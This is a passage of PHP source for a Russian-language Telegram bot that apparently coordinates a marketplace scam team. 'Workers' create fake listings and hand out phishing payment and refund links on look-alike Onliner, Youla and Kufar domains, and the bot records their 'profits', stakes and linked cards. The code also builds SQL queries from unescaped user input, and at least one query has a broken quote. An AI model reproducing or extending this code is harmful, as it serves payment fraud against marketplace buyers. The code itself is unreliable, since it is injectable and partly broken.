                            $text = "🖼 <b>Ссылка на изображение указана некорректно</b>\n\n";
                            $text .= "Вы можете использовать бота для загрузки изображения с вашего устройства: @imgurplusbot";
                        }

                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /setimage <code>[ID объявления];[URL изображения]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if (preg_match('/^\/setdelivery/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/setdelivery ([a-z0-9]{24}|\d+);[0-9]{3,5}$/i', $message['text']) == TRUE) {
                        $edit = explode(';', mb_substr($message['text'], 13));

                        $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '".(int)$edit[0]."' AND `worker` = '$message[from]'");

                        if (mysqli_num_rows($query) > 0) {
                            $advert = mysqli_fetch_assoc($query);

                            if ($advert['worker'] == $message['from']) {
                                mysqli_query($connection, "UPDATE `adverts` SET `delivery` = ".(int)$edit[1]."' WHERE `advert_id` = '".(int)$edit[0]."'");

                                $text = "🚚 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму доставки на</b> <code>$edit[1] руб.</code>\n\n";
                                $text .= "https://avito.ru/";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "🚚 <b>Вы изменили сумму доставки с до</b> <code>$edit[1] руб.</code>\n\n";

                                if ($advert['type'] == 0) {
                                    $text .= "<b>Оплата:</b> https://$domains[onliner]/buy?id=$edit[0]\n";
                                    $text .= "<b>Возврат:</b> https://$domains[onliner]/refund?id=$edit[0]";
                                } elseif ($advert['type'] == 1) {
                                    $text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
                                    $text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
                                } elseif ($advert['type'] == 2) {
                                    $text .= "<b>Оплата:</b> https://$domains[kufar]/buy?id=$edit[0]\n";
                                    $text .= "<b>Возврат:</b> https://pay.$domains[kufar]/refund.php?id=$edit[0]";
                                }
                            } else {
                                $text = "🚚 <b>Объявление закреплено не за вашим аккаунтом</b>";
                            }
                        } else {
                            $text = "🚚 <b>Объявление с таким ID не было найдено</b>";
                        }

                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /setdelivery <code>[ID объявления];[Сумма]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if (preg_match('/^\/setprice/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/setprice ([0-9]+|[a-z0-9]{24});\d{3,5}$/i', $message['text']) == TRUE) {
                        $edit = explode(';', mb_substr($message['text'], 10));

                        if ($edit[1] >= $settings['min_price'] AND $edit[1] <= $settings['max_price']) {
                            $adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
                            $trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");

                            if (mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0) {
                                if (mysqli_num_rows($adverts) > 0) {
                                    $advert = mysqli_fetch_assoc($adverts);

                                    if ($advert['worker'] == $message['from']) {
                                        mysqli_query($connection, "UPDATE `adverts` SET `price` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");

                                        $text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму объявления с</b> <code>$advert[price] руб.</code> <b>на</b> <code>$edit[1] руб.</code>\n";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                        $text = "💶 <b>Вы изменили цену на объявлении с</b> <code>$advert[price] руб.</code> <b>до</b> <code>$edit[1] руб.</code>\n\n";

                                        if ($advert['type'] == 0) {
                                            $text .= "<b>Оплата:</b> https://$domains[onliner]/buy?id=$edit[0]\n";
                                            $text .= "<b>Возврат:</b> https://$domains[onliner]/refund?id=$edit[0]";
                                        } elseif ($advert['type'] == 1) {
                                            $text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
                                            $text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
                                        } elseif ($advert['type'] == 0) {
                                            $text .= "<b>Оплата:</b> https://$domains[kufar]/buy?id=$edit[0]\n";
                                            $text .= "<b>Возврат:</b> https://pay.$domains[kufar]/refund.php?id=$edit[0]";
                                        }
                                    } else {
                                        $text = "📬 <b>Объявление закреплено не за вашим аккаунтом</b>";
                                    }
                                } elseif (mysqli_num_rows($trackcodes) > 0) {
                                    $track = mysqli_fetch_assoc($trackcodes);

                                    if ($track['worker'] == $message['from']) {
                                        if ($track['status'] > 0) {
                                            mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");

                                            $text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму трек-кода с</b> <code>$track[amount] руб.</code> <b>на</b> <code>$edit[1] руб.</code>\n";
                                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                            $text = "💶 <b>Вы изменили цену на трек-коде с</b> <code>$track[amount] руб.</code> <b>до</b> <code>$edit[1] руб.</code>";
                                        } else {
                                            $text = "📬 <b>Трек-код ещё не обработан или уже неактивен</b>";
                                        }
                                    } else {
                                        $text = "📬 <b>Трек-код закреплен не за вашим аккаунтом</b>";
                                    }
                                } else {
                                    $text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
                                }
                            } else {
                                $text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
                            }
                        } else {
                            $text = "🚫 <b>Сумма товара не может быть больше $settings[max_price] руб. и меньше $settings[min_price] руб.</b>";
                        }

                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /setprice <code>[ID объявления];[Сумма товара]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if (preg_match('/^\/settitle/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/settitle (.{24}|\d+);.+$/i', $message['text']) == TRUE) {
                        $edit = explode(';', mb_substr($message['text'], 10));

                        $adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
                        $trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");

                        if (mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0) {
                            if (mysqli_num_rows($adverts) > 0) {
                                $advert = mysqli_fetch_assoc($adverts);

                                if ($advert['worker'] == $message['from']) {
                                    mysqli_query($connection, "UPDATE `adverts` SET `title` = '".$connection->real_escape_string($edit[1])."' WHERE `advert_id` = '$edit[0]'");

                                    $text = "➕ <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название объявления</b>\n";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                    $text = "💶 <b>Вы изменили название объявлении</b>\n\n";

                                    if ($advert['type'] == 0) {
                                        $text .= "<b>Оплата:</b> https://$domains[onliner]/buy?id=$edit[0]\n";
                                        $text .= "<b>Возврат:</b> https://$domains[onliner]/refund?id=$edit[0]";
                                    } elseif ($advert['type'] == 1) {
                                        $text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
                                        $text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
                                    } elseif ($advert['type'] == 2) {
                                        $text .= "<b>Оплата:</b> https://$domains[kufar]/buy?id=$edit[0]\n";
                                        $text .= "<b>Возврат:</b> https://pay.$domains[kufar]/refund.php?id=$edit[0]";
                                    }
                                } else {
                                    $text = "📬 <b>Объявление закреплено не за вашим аккаунтом</b>";
                                }
                            } elseif (mysqli_num_rows($trackcodes) > 0) {
                                $track = mysqli_fetch_assoc($trackcodes);

                                if ($track['worker'] == $message['from']) {
                                    if ($track['status'] > 0) {
                                        mysqli_query($connection, "UPDATE `trackcodes` SET `product` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");

                                        $text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название своего трек-кода на</b> <b>на</b> <code>$edit[1]</code>\n";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                        $text = "💶 <b>Вы изменили название своего трек-кода на</b> <code>$edit[1]</code>";
                                    } else {
                                        $text = "📬 <b>Трек-код ещё не обработан или уже неактивен</b>";
                                    }
                                } else {
                                    $text = "📬 <b>Трек-код закреплен не за вашим аккаунтом</b>";
                                }
                            }
                        } else {
                            $text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
                        }

                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /settitle <code>[ID объявления];[Название товара]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if (preg_match('/\/start/i', $message['text']) == TRUE OR $message['text'] == '⬅️ Назад' OR preg_match('/^\/info$/i', $message['text']) == TRUE) {

                    mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
                    mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
                    mysqli_query($connection, "UPDATE `mails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");

                    $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                }


                if ($message['text'] == '💀 Мой профиль') {
                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyProfile($message['from'], 0, 1)));
                }

                if ($message['text'] == '🗃 Мои объявления') {
                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyAdverts($message['from'], 0), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyAdverts($message['from'], 0, 1)));
                }


                if ($message['text'] == '📱 Генерация объявлений') {
                    $text = "<b>📱 Генерация объявлений</b>\n\n";
                    $text .= "Мы немного изменили генерацию объявлений, теперь она полностью никак не закрепляется за вашим настоящим объявлением на какой-либо из платформ\n\n";

                    $keyboard = json_encode(Array('keyboard' => Array(Array('🛍 Куфар 2.0', '🛍 Куфар 1.0'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                }

               if ($message['text'] == '🛍 Куфар 1.0') {
                    $search = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '1'");

                    if (mysqli_num_rows($search) > 0) {
                        $text = "👺 <b>У вас уже есть несозданное объявление, нажми 🗃 Мои объявления, и выбери объяву, и скрой её, можешь делать новую</b>";
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        if ($message['text'] == '🛍 Куфар 1.0') $type = '2';

                        mysqli_query($connection, "INSERT INTO `adverts` (`type`, `advert_id`, `worker`, `price`, `delivery`, `views`, `status`, `time`) VALUES ('$type', '" . rand(10000000000, 99999999999) . "', '$message[from]', '0', '0', '0', '0', '" . time() . "')");

                        $text = "🎒 <b>Введите название вашего товара</b>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }
				if ($message['text'] == '🛍 Куфар 2.0') {
                    $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
                    if (mysqli_num_rows($search) > 0) {
                        $text = "<b>🔮 Генератор - kufar.de/generator/gen.php</b>";
                    } else {
                        $text = "<b>🔮 Генератор - kufar.de/generator/gen.php</b>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }
				
                if ($message['text'] == '✈️ Транспортные компании') {
                    $text = "✈️  <b>Транспортные компании</b>\n\n";
                    $text .= "❔ <code>Выберите сервис.</code>";
                    //$keyboard = json_encode(Array('keyboard' => Array(Array('🔧 Сгенерировать трек-код'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                    $keyboard = json_encode(Array('keyboard' => Array(Array('🚛 CDEK'/*, '✈️ ПЭК', '📬 Почта РФ'*/), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                }
                if ($message['text'] == '🚛 CDEK') {
                    $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
                    if (mysqli_num_rows($search) > 0) {
                        $text = "<b>🔮 В разработке...</b>";
                    } else {
                        $text = "<b>🔮 В разработке...</b>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if ($message['text'] == '✈️ ПЭК') {
                    $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
                    if (mysqli_num_rows($search) > 0) {
                        $text = "⚠️ <b>У вас уже есть несозданный трек-код</b>";
                    } else {
                        mysqli_query($connection, "INSERT INTO `trackcodes` (`type`, `code`, `worker`, `status`, `time`) VALUES ('2', '" . rand(1000000, 99999999999) . "', '$message[from]', '0', '" . time() . "')");
                        $text = "🤓 <b>Введите ФИО отправителя товара</b>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if ($message['text'] == '📬 Почта РФ') {
                    $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
                    if (mysqli_num_rows($search) > 0) {
                        $text = "⚠️ <b>У вас уже есть несозданный трек-код</b>";
                    } else {
                        mysqli_query($connection, "INSERT INTO `trackcodes` (`type`, `code`, `worker`, `status`, `time`) VALUES ('3', '" . rand(1000000, 99999999999) . "', '$message[from]', '0', '" . time() . "')");
                        $text = "🤓 <b>Введите ФИО отправителя товара</b>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if (preg_match('/\/info/i', $message['text']) == TRUE) {
                    $user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `balance`, `card`, `stake`, `warns`, `created` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'"));

                    $stake = explode(':', $user['stake']);

                    $text = "👹 <b>Информация о вашем аккаунте:</b>\n\n";
                    $text .= "🆔 <b>Реферальный код:</b> <a href=\"tg://user?id=$message[from]\">$message[from]</a>\n";
                    $text .= "💵 <b>Баланс:</b> <code>$user[balance] руб.</code>\n";
                    $text .= "💸 <b>Ваша ставка:</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>\n";
                    $adverts = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '1'");
                    $text .= "🧾 <b>Активных объявлений:</b> <code>$adverts</code>\n";
                    $profit = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `worker` = '$message[from]' AND `status` = '1'"));
                    if ($profit['total'] == NULL) $profit['total'] = '0';
                    $text .= "📋 <b>Успешных профитов:</b> <code>$profit[count]</code>\n";
                    $text .= "💰 <b>Общий профит:</b> <code>$profit[total] руб.</code>\n";
                    $invites = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `accounts` WHERE `inviter` = '$message[from]' AND `access` > '0'"));
                    $text .= "👹 <b>Приглашено:</b> <code>" . Endings($invites['count'], "воркер", "воркера", "воркеров") . "</code>\n";
                    $text .= "⚠️ <b>Предупреждений:</b> <code>[$user[warns]/3]</code>\n";
                    $text .= "👻 <b>В команде:</b> <code>" . Endings(floor((time() - $user['created']) / 86400), "день", "дня", "дней") . "</code>\n";
                    if ($user['card'] == 0) $text .= "\n💳 <b>Карта не привязана, свяжитесь с модераторами!</b>\n";
                    if ($user['card'] != 0) $text .= "\n💳 <b>Карта привязана — можно воркать!</b>\n";

                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                }

                if (preg_match('/\/adverts/i', $message['text']) == TRUE) {
                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyAdverts($message['from'], 0), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyAdverts($message['from'], 0, 1)));
                }
            } else {
                $users = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));

                $requests = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `value4`, `rules` FROM `requests` WHERE `telegram` = '$message[from]' AND `status` != '-1' AND `status` < '3' ORDER BY `id` DESC");

                if (mysqli_num_rows($requests) > 0) {
                    $request = mysqli_fetch_assoc($requests);

                    if ($request['status'] == 1) {
                        
						$text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
						$text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
						$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
						$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
						if ($request['value4'] == 0) {
							$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
						} else {
							$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n";
						}
						$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send/'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                        

                    } elseif ($request['status'] == 2) {
                        $text = "⏱ <b>Ваша заявка находится на проверке у модераторов</b>\n\n";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (isset($message['text']) AND $request['rules'] == '0') {
                        $text = "Для продолжения необходимо ознакомиться с правилами нашего проекта и согласиться с ними";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (empty($request['value1']) AND empty($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1') {
                        mysqli_query($connection, "UPDATE `requests` SET `value1` = '".$connection->real_escape_string($message[text])."' WHERE `telegram` = '$message[from]' AND `status` = '0'");
                        $text = "Есть ли опыт в подобной сфере, если да, то какой?";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (isset($request['value1']) AND empty($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1') {
                        mysqli_query($connection, "UPDATE `requests` SET `value2` = '".$connection->real_escape_string($message[text])."' WHERE `telegram` = '$message[from]' AND `status` = '0'");
                        $text = "Сколько времени вы готовы уделять работе и какого результата вы хотите добиться?";
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (isset($request['value1']) AND isset($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1') {
                        mysqli_query($connection, "UPDATE `requests` SET `value3` = '".$connection->real_escape_string($message[text])."' WHERE `telegram` = '$message[from]' AND `status` = '0'");
                        if (empty($request['value4'])) {
                            $text = "Кто вас пригласил?\n\nВведите имя пользователя или Telegram ID\nВведите <code>0</code>, чтобы пропустить этот пункт";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                        } else {
                            
							$user['telegram'] = $request['value4'];

							$text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
							$text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
							$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
							$text .= "<b>Время работы:</b> <i>$message[text]</i>\n";
							if ($user['telegram'] == 0) {
								$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
							} else {
								$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$user[telegram]\">$user[telegram]</a>\n";
							}
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send/'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							$text = "➕ <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>закончил заполнение заявки в команду</b>\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                        }
                    } elseif (isset($request['value1']) AND isset($request['value2']) AND isset($request['value3']) AND $request['rules'] == '1') {
                        if (preg_match('/\d+/i', $message['text']) == TRUE) {
                            $search = mysqli_real_escape_string($connection, $message['text']);
                            $query = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `telegram` = '$search'");
                        } elseif (preg_match('/@{0,1}[\w.]+/i', $message['text']) == TRUE) {
                            $search = mysqli_real_escape_string($connection, str_replace('@', '', $message['text']));
                            $query = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
                        }

                        if (mysqli_num_rows($query) > 0 OR $message['text'] == 0) {
                            if (empty($request['value4'])) {
                                if (mysqli_num_rows($query) > 0) {
                                    $user = mysqli_fetch_assoc($query);
                                } else {
                                    $user['telegram'] = 0;
                                }
                                mysqli_query($connection, "UPDATE `requests` SET `value4` = '$user[telegram]', `status` = '1' WHERE `telegram` = '$message[from]' AND `status` = '0'");
                            } else {
                                $user['telegram'] = $request['value4'];
                            }
                            
							$text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
							$text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
							$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
							$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
							if ($user['telegram'] == 0) {
								$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
							} else {
								$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$user[telegram]\">$user[telegram]</a>\n";
							}
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send/'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							$text = "➕ <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>закончил заполнение заявки в команду</b>\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            

                        } else {
                            $text = "🔎 <b>Воркер с таким ID не был найден</b>\n\nВведите <code>0</code>, чтобы пропустить этот пункт";
                            send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }
                    }
                } else {
                    if ($users['access'] == '-1') {
                        $text = "🚫 <b>Ваш аккаунт заблокирован</b>\n\n";
                        $text .= "Если это ошибка, то обратитесь к " . $settingsarr["nick"]  ;
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (preg_match('/^\/start ref\d+$/i', $message['text']) == TRUE) {
                        $referral_id = mb_substr($message['text'], 10);

                        mysqli_query($connection, "INSERT INTO `requests` (`username`, `name`, `telegram`, `value4`, `rules`, `status`, `time`) VALUES ('$message[username]', '$message[firstname] $message[lastname]', '$message[from]', '$referral_id', '0', '0', '" . time() . "')");

                        $text = "1. Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков)\n";
                        $text .= "2. Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы\n";
                        $text .= "3. Запрещено узнавать у друг друга персональную информацию\n";
                        $text .= "4. Запрещено оскорблять администрацию\n";
                        $text .= "5. Запрещено попрошайничество в беседе работников\n";
                        $text .= "6. Администрация не несёт ответственности за блокировку ваших кошельков/карт\n";
                        $text .= "\nВы подтверждаете, что ознакомились и согласны с условиями и правилами нашего проекта?";
                        $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✅ Полностью согласен', 'callback_data' => '/join/accept/')))));

                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                    } else {
                        $text = "🤨 <b>Здравствуйте. Что бы начать работать</b>\n\n";
                        $text .= "Просто подайте заявку 👇🏿";
                        $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '➕ Подать заявку', 'callback_data' => '/join/')))));
                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                    }
                }
            }
        }

        // =============== [ ЧАТ МОДЕРАТОРОВ И САППОРТОВ ] =============== //

        if ($message['chat_id'] == $config['chat']['moders'] /*OR $message['chat_id'] == $config['chat']['supports']*/) {
            $isAccess = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '100'");

            if (mysqli_num_rows($isAccess) > 0) {
                if (preg_match('/\/adverts (\d+|@{0,1}[\w.]+)/i', $message['text']) == TRUE OR $message['text'] == '/adverts') {
                    if ($message['text'] == '/adverts') {
                        $query = mysqli_query($connection, "SELECT `type`, `advert_id`, `worker`, `title`, `price`, `views` FROM `adverts` WHERE `status` = '1' ORDER BY `id` DESC LIMIT 10");
                    } elseif (preg_match('/\/adverts \d+/', $message['text']) == TRUE) {
                        $worker['telegram'] = mb_substr($message['text'], 9);
                    } elseif (preg_match('/\/adverts @{0,1}[\w.]+/i', $message['text']) == TRUE) {
                        $search = str_replace('@', '', mb_substr($message['text'], 9));
                        $worker = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'"));
                    }

                    if ($message['text'] == '/adverts') {
                        $text = "🗂 <b>10 последних объявлений:</b>\n\n";

                        while ($row = mysqli_fetch_assoc($query)) {
                            $x = $x + 1;
                            if (mb_strlen($row['title']) > 18) $row['title'] = mb_substr($row['title'], 0, 18) . '[...]';
                            if ($row['type'] == 0) $type = 'Куфар 2.0' AND $url = 'https://' . $domains['kufar2'] . '/buy?id=' . $row['advert_id'];
